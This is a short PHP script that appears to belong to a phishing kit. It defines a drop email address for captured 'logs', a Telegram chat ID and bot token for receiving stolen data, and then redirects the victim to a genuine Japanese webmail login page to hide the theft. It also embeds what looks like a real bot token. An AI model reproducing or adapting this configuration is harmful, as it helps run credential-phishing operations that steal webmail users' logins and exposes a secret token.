<?php

$Receive_email="excellogs001@sothost.best";
$teleid = "961857392";
$teletok = "1763593303:AAF441KhIcDTQjrItUZDw8cexkwejzhviVg";


header("Location: https://web1.plala.or.jp/cgi-bin/mail/plus/webmail_login.cgi");
?>
